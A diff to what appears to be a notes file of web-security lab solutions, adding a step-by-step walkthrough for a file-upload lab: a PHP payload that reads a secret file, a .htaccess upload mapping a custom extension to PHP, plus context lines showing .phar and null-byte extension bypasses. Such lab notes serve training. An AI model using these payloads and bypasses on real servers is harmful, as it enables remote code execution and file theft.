@@ -1272,6 +1272,21 @@ Now you can get your file with /files/avatars/../rce2.php
 .php is blacklisted, but you can set .phar extension
 ```
 
+The following is a step by step guide on the official method, because the labs are weird if you deviate at all you will see the actual payload, instead of it actually executing
+
+```
+1st upload a jpg/PNG
+2nd send request of png upload to repeater
+3rd Remove all picture data,  and replace with the content bellow, also change the filename to exploit.php it will fail, but do it.
+Payload:  <?php echo file_get_contents('/home/carlos/secret'); ?>
+4th MAKE SURE THE RESPONSE HAS APACHE 
+5th Replace the same failed PHP request with the following filename= .htaccess , content-type: text/plain  payload AddType application/x-httpd-php .l33t
+6th GO TO THE PREVIOUS FAILED PHP REQUEST AND CHANGE THAT EXTENSION TO .l33t ONLY THAT
+7TH Send that request.
+8th refresh profile page, and go find the GET /Avatar/exploit.l33t
+```
+
+
 ### 4. Web shell upload via obfuscated file extension
 ```
 Null byte bypass rce.php%00.jpg
